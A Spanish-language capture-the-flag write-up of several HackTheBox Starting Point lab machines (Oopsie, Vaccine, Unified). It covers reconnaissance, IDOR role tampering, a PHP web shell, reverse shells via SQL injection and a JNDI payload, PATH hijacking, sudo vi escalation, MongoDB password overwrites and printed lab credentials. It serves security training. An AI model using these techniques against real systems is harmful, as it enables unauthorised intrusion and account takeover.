Al abrir este archivo vemos un Information Disclosure, con las credenciales del administrador
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/privesc2.png" alt="under" oncontextmenu="return false;">
</div>


/user:administrator MEGACORP_4dm1n!!

Probamos conexión y somos administrator:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/esc.png" alt="under" oncontextmenu="return false;">
</div>


Solo será cuestión de buscar la flag y habremos completado la máquina.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/rootflag.png" alt="under" oncontextmenu="return false;">
</div>



<hr />
<h2 id="oopsie"><h1 class="amarillo">Oopsie</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/oopsie.webp" alt="under" oncontextmenu="return false;">
</div>
Encendemos la máquina y nos da la dirección IP 10.129.165.105, comenzando lanzando ping para saber si esta activa.

```bash
ping -c 5 10.129.165.105
PING 10.129.165.105 (10.129.165.105) 56(84) bytes of data.
64 bytes from 10.129.165.105: icmp_seq=1 ttl=63 time=111 ms
64 bytes from 10.129.165.105: icmp_seq=2 ttl=63 time=107 ms
64 bytes from 10.129.165.105: icmp_seq=3 ttl=63 time=108 ms
64 bytes from 10.129.165.105: icmp_seq=4 ttl=63 time=108 ms
64 bytes from 10.129.165.105: icmp_seq=5 ttl=63 time=107 ms

--- 10.129.165.105 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 106.742/108.161/111.090/1.513 ms
```

Con un TTL 63, estamos frente a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Usando nmap lanzamos un escaneo rápido y sigiloso:

```bash
nmap -p- --open -sS --min-rate -vvv -n -Pn 10.129.165.10.5 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/namp.png" alt="under" oncontextmenu="return false;">
</div>
 

Usando **extractPorts** para limpiar el ruido de la captura de nmap vemos puerto 22 y 80 abiertos:
<div  style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>


Lanzamos una serie de scripts básicos de reconocimiento con nmap para identificar la version y servicio:

```bash
nmap -sCV -p22,80 10.129.165.105 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/nmap2.png" alt="under" oncontextmenu="return false;">
</div>


<h2 class="amarillo">Explotación</h2>

Seguimos enumerando el servicio web
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/whatweb.png" alt="under" oncontextmenu="return false;">
</div>


Y encontramos un directorio '/uploads' usando la herramienta `gobuster`
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/dirbust.png" alt="under" oncontextmenu="return false;">
</div>


Vamos a la página pero, no encontramos nada:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/web.png" alt="under" oncontextmenu="return false;">
</div>


Vamos al directorio '/uploads' pero, no tenemos acceso:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/web1.png" alt="under" oncontextmenu="return false;">
</div>


Al no encontrar directorios, y la máquina no esta haciendo **vhost**, hay otra manera de enumerar una página web y mediante **Proxies**.

----
<h3 class="verde">¿Qué es Web Crawl?</h3>

Un web crawl o rastreo de sitios web es el proceso de analizar el contenido de un sitio web. Esto se hace mediante un software automatizado llamado web crawler, araña web o bot.

La herramienta **Burpsuite** permite hacer este mapeo recibiendo una petición.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/brup.png" alt="under" oncontextmenu="return false;">
</div>


Al igual que **Caido**:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/webcrawl.png" alt="under" oncontextmenu="return false;">
</div>


Y así encontramos el panel de login, pero no hay forma de burlar el panel de autenticación. Entonces le damos en 'Login as Guest'.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/web2.png" alt="under" oncontextmenu="return false;">
</div>


Nos encontramos con un menu de usuario y registros y tenemos un id guardado en *Storage*, vemos un role=guest, y user=2233. Esto significa que ese es nuestro identificador en la paǵina:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc.png" alt="under" oncontextmenu="return false;">
</div>


La página tiene una variable id=2, significa que podemos probar a cambiar su valor a 1:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc2.png" alt="under" oncontextmenu="return false;">
</div>


Y nos lista el role=admin, y el id=34322
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc3.png" alt="under" oncontextmenu="return false;">
</div>


Si cambiamos estos valores en la página y recargamos, seremos admin.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc4.png" alt="under" oncontextmenu="return false;">
</div>


Siendo admin ya tenemos acceso a la ruta '/uploads', donde podemos probar subir un script en php.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc5.png" alt="under" oncontextmenu="return false;">
</div>
<br>
<strong>Shell PHP</strong>:
```php
<?php
system($_GET["cmd"]);
?>
```

Subiendo el archivo y llendo a '/uploads/' usando la variable cmd vemos que tenemos ejecución remota de comandos.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/RCE.png" alt="under" oncontextmenu="return false;">
</div>


Le subimos una reverse shell en php.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/intrusion.png" alt="under" oncontextmenu="return false;">
</div>


Ahora para salir del usuario 'www-data', haremos:

```bash
cat * | grep -i passw*
```

Y nos arroja la contraseña del usuario 'robert':
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/lat.png" alt="under" oncontextmenu="return false;">
</div>


```
robert M3g4C0rpUs3r!
```

Nos logueamos como robert:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/intrusion2.png" alt="under" oncontextmenu="return false;">
</div>


Y ya tendremos la flag:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/user.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Escalada</h2>

Para la escalada con un `sudo -l` vemos que podemos ejecutar el binario `cat` como root. Dentro del sistema de archivo por lo general tenemos capacidad de escritura en `/dev/shm` y en `/tmp/`, entonces dentro de cualquiera de estos directorios creamos un archivo llamado **cat**, y lo abrimos con para ingresar:

**cat**:
```bash
/bin/bash
```

Le damos permisos de ejecución con *chmod +x cat*, y hacemos un Path hijacking.

```bash
export PATH=/tmp:$PATH
```

Logrando que se ejecuto primero nuestro binario malicioso *cat*. Y seremos root
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/oopsie/esc6.png" alt="under" oncontextmenu="return false;">
</div>



<hr />
<h2 id="vaccine"><h1 class="amarillo">Vaccine</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/vaccine.webp" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina y nos da la dirección IP 10.129.122.95 y usamos ping para saber si la máquina esta activa:

```bash
❯ ping -c 5 10.129.122.95
PING 10.129.122.95 (10.129.122.95) 56(84) bytes of data.
64 bytes from 10.129.122.95: icmp_seq=1 ttl=63 time=124 ms
64 bytes from 10.129.122.95: icmp_seq=2 ttl=63 time=123 ms
64 bytes from 10.129.122.95: icmp_seq=3 ttl=63 time=129 ms
64 bytes from 10.129.122.95: icmp_seq=4 ttl=63 time=121 ms
64 bytes from 10.129.122.95: icmp_seq=5 ttl=63 time=121 ms

--- 10.129.122.95 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 120.835/123.672/129.102/3.047 ms
```

Vemos un TTL 63 significa que estamos frente a un Linux.
<h1 class="amarillo">Enumeración</h1>

Hacemos uso de nmap a la IP 10.129.122.95 para comenzar toda la parte de enumeración de puertos e identificación de servicios y lo exportamos nuestro escaneo al archivo allPorts

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.122.95 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Limpiamos la captura con **extractPorts** pasandole como argumento nuestra captura allPorts:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que nos reporta los puertos `21,22,80` como abiertos, pues con esta información podemos hacer un escaneo exhaustivo con nmap para identificar la version y servicio que corren para estos puertos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

 Vemos que nmap nos reporta que el puerto `21` tiene el **FTP ANON** habilitado y como hay un recurso llamado **backup.zip**, por otro lado tenemos el `ssh` y un servicio web.
<h1 class="amarillo">Explotación</h1>

Para la explotación nos conectaremos al servicio FTP usando las credenciales de anonymous sin proporcionar contraseña y podremos ver el archivo *backup.zip* él cual podremos traer a nuestro equipo con get.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/fpt.png" alt="under" oncontextmenu="return false;">
</div>


Podemos intentar con 7z extraer el archivo .zip:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/ftp2.png" alt="under" oncontextmenu="return false;">
</div>

Pero nos pide proporcionar contraseña.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/ftp3.png" alt="under" oncontextmenu="return false;">
</div>

Dejaremos un poco de lado el comprimido para enumerar un poco el servicio web con la utilidad `whatweb`
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que nos reporta lo mismo que nmap sobre el titulo de la página.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/web.png" alt="under" oncontextmenu="return false;">
</div>

Accedemos desde nuestro navegador y efectivamente desde MegaCorp se nos presenta un panel de Login:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/web.png" alt="under" oncontextmenu="return false;">
</div>

Podemos intentar utilizando `zip2john` para romper la contraseña del comprimido:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/john.png" alt="under" oncontextmenu="return false;">
</div>

Y ejecutamos john con el diccionario del rockyou pasandole el hash del comprimido.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/john2.png" alt="under" oncontextmenu="return false;">
</div>

Y nos reporta que la contraseña es **741852863**
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/zip.png" alt="under" oncontextmenu="return false;">
</div>

Vamos a mirar el contenido del backup:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/zip2.png" alt="under" oncontextmenu="return false;">
</div>

y vemos credenciales en texto plano, podemos probar a utilizarlas en el panel de administración de MegaCorp pero no funciona, por el formato de la contraseña podemos ver que solo cuenta con números y letras de a hasta la f, por tanto si probamos MD5:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/md5.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que la credencial para admin ->  qwerty789
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/web3.png" alt="under" oncontextmenu="return false;">
</div>

Una vez loguedos en la página podemos ver unas listas y un barra de búsqueda, si buscamos algo...
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/web4.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que está viajando por URL nuestra búsqueda, eso tiene muy mala pinta porque puede significar una base de datos por detrás, podemos probar con `SQLMAP` a intentar si es posible acontecer alguna injección SQL, debemos tomar la cookie del usuario admin:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/cookie.png" alt="under" oncontextmenu="return false;">
</div>

Y lanzamos SQLMAP:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/SQL.png" alt="under" oncontextmenu="return false;">
</div>

Siendo vulnerable podemos ponernos en escucha con ncat y usando rlwrap para tener un poco más de control, y podemos probar con sql ejecutar una reverse shell:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/intrusion.png" alt="under" oncontextmenu="return false;">
</div>

Una vez dentros podemos enumerar un poco el directorio y los ficheros que tenemos y eventualmente encontraremos la flag del usuario:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/user.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Escalada</h1>

Para la escalada husmeando entre los archivos de configuración encontramos un nombre de bases de datos `carsdb` y un usuario y contraseña.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/esc1.png" alt="under" oncontextmenu="return false;">
</div>

Por tanto, haciendo uso de `sudo -l` para listar algún privilegio que podamos tener como sudo vemos que podemos ejecutar /bin/vi como root:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/esc2.png" alt="under" oncontextmenu="return false;">
</div>

Podemos aprovecharnos del privilegio que tenemos sobre el binario vi para escalar privilegios
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/vaccine/root.png" alt="under" oncontextmenu="return false;">
</div>


Y hemos completado la máquina.

<hr />
<h2 id="unified"><h1 class="amarillo">Unified</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/unified.webp" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina y obtenemos la dirección ip 10.129.135.195, comprobamos que se encuentre encendida utilizando ping:

```bash
❯ ping -c 5 10.129.135.195
PING 10.129.135.195 (10.129.135.195) 56(84) bytes of data.
64 bytes from 10.129.135.195: icmp_seq=1 ttl=63 time=116 ms
64 bytes from 10.129.135.195: icmp_seq=2 ttl=63 time=113 ms
64 bytes from 10.129.135.195: icmp_seq=3 ttl=63 time=111 ms
64 bytes from 10.129.135.195: icmp_seq=4 ttl=63 time=113 ms
64 bytes from 10.129.135.195: icmp_seq=5 ttl=63 time=112 ms
```

Vemos un TTL de 63, por tanto estamos frente a una máquina Linux.
<h1 class="amarillo">Enumeración</h1>

Comenzamos la enumeración lanzando un escaneo potente, rápido y sigiloso con nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.135.195 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Hacemos Parsing a la información más relevante de la captura utilizando nuestra función **extractPorts** y lanzamos un escaneo exhaustivo con nmap:

```bash
nmap -sCV -p22,6789,8080,8443,8843.8880 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

<h1 class="amarillo">Explotación</h1>

Vemos algunos puertos extraños utilizando http, así tratamos de acceder a la web por el puerto 8443 y se nos redirige a este panel de login
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/web.png" alt="under" oncontextmenu="return false;">
</div>

Lo primero que probaríamos es buscar en Google que es UniFi y la version 6.4.54 y buscar las credenciales por defecto:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/web2.png" alt="under" oncontextmenu="return false;">
</div>

Pero esto no funciona, probamos a interceptar esta petición con Caido:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/caido.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos una variable que llama la atención "strict" en true, pero buscando más en intenet vemos que realmente el campo vulnerable es el remember, podemos introducir un payload tal que:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/caido2.png" alt="under" oncontextmenu="return false;">
</div>

Mientras probamos un payload nos ponemos en escucha para saber si la web puede intentar acceder a un recurso de nuestra máquina.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/caido3.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos un ldap de nuestro lado y como nos ha llegado la petición. En lugar de eso podemos probar una reverse shell en base64:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/pay.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos en internet un exploit `rogue-jndi` con java que nos permite explotar y tener ejecución remota de comandos en esta máquina. Para ello utilizamos java y que nos interprete nuestra reverse shell en base64
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/pay.png" alt="under" oncontextmenu="return false;">
</div>

Vemos como el exploit de java nos responde con o=tomcat y obtenemos una shell:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/intrusion.png" alt="under" oncontextmenu="return false;">
</div>

De esta manera podremos ver la user.txt

<h1 class="amarillo">Escalada</h1>

Para la escala no encontramos permisos SUID ni capabilities, ni tenemos permisos sobre algún binario. Probamos a filtrar los procesos que corren localmente en la máquina y vemos que nos reporta un servicio mongo:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a utilizar mongo:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
```

Y vemos unas credenciales:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc2.png" alt="under" oncontextmenu="return false;">
</div>

```python
administrator@unified.htb
$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4
```

Pero es un hash la contraseña que no podemos romper, pero podemos modificar la base de datos mongo, así creamos nuestra propia contraseña y vamos a cambiarsela al usuario administrator:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc3.png" alt="under" oncontextmenu="return false;">
</div>

Ahora vamos a escribir nuestra contraseña:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$zd3aCG0uN4FkSFpM$txBM8YnmCuifebw9sZ5gh56wtSwlBMFZ4O8f0MB79h0V2y3r/uaGAslpb3YkRWDtEQo8jfvn0PDUMg47EOlx8."}})'
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc4.png" alt="under" oncontextmenu="return false;">
</div>

Y cuando volvemos al panel de login podremos iniciar sesión:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc5.png" alt="under" oncontextmenu="return false;">
</div>

Revisando un poco la web podemos ver que podemos ver información sobre el ssh.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/esc6.png" alt="under" oncontextmenu="return false;">
</div>

Usando las credenciales por ssh podremos conectarnos como root y listar la flag:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/unified/root.png" alt="under" oncontextmenu="return false;">
</div>

Y así hemos completado todo el Starting Point de HackTheBox, la verdad ha sido muy útil para reforzar y dar comienzo a esta formación en un campo tan interesante como el Pentesting.

---

Esta publicación ha sido creada como soporte en mi formación académica y crecimiento profesional.

© Juan David Garcia Acevedo (aka liandd)
